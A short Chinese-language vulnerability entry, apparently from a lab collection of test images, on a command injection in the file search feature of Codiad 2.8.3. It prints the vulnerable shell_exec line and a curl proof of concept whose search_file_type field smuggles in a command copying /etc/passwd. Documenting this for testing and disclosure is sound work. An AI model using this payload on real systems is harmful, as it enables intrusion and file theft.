## 文件查找 - 命令注入漏洞

测试镜像

* src/codiad/2.8.3

影响版本

* 2.8.3

参考链接

* [Codiad在线IDE框架远程命令执行漏洞分析](http://www.freebuf.com/articles/web/141788.html)

Poc

```
# 请先修改 cookie
curl 'http://127.0.0.1/components/filemanager/controller.php?action=search&path=/tmp/demo/&type=0' -H 'Cookie: 40d1b2d83998fabacb726e5bc3d22129=vlbh200p9c5p3a2ni6e0d3ecb5; cecfeb9f0e60abb79e183c90660419a6=33qhp27nns3mcc4a8udiavird2' -d 'search_string=php&search_file_type=";cp /etc/passwd /tmp/hacked;"'; echo
```

关键代码

```
# 命令注入
$output = shell_exec('find -L ' . $this->path . ' -iregex  ".*' . $this->search_file_type  . '" -type f | xargs grep -i -I -n -R -H "' . $input . '"');
```

